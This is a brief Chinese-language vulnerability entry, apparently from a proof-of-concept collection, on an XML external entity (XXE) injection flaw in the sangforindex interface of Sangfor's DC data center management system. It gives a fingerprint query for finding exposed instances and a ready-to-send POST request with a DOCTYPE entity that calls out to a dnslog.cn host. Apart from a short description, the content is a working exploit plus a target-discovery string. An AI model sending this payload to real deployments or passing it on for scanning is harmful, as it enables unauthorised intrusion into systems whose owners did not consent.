# 深信服 DC数据中心管理系统 sangforindex XML实体注入漏洞

## 漏洞描述

深信服 DC数据中心管理系统 sangforindex 接口存在XML实体注入漏洞，攻击者可以发送特定的请求包造成XML实体注入

## 漏洞影响

深信服 DC数据中心管理系统

## 网络测绘

```
"SANGFOR 数据中心"
```

## 漏洞复现

登陆页面

![image-20230828143259744](images/image-20230828143259744.png)

验证POC

```
POST /src/sangforindex HTTP/1.1
Host: 
Content-Type: text/xml

<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE root [
    <!ENTITY rootas SYSTEM "http://xgsg1k.dnslog.cn">
]>
<xxx>
&rootas;
</xxx>
```

![image-20230828143318826](images/image-20230828143318826.png)